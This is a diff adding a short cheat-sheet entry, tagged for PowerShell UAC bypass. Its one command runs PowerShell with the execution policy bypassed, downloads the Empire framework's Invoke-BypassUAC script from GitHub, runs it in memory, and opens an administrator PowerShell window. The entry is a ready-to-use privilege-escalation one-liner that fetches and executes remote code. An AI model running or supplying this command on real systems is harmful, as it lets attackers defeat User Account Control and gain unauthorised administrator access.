@@ -1,0 +1,6 @@
+---
+Tags: [powershell, pwsh, bypass, uac]
+---
+
+## Bypass UAC and launch PowerShell window as admin
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC-Command 'start powershell.exe'"
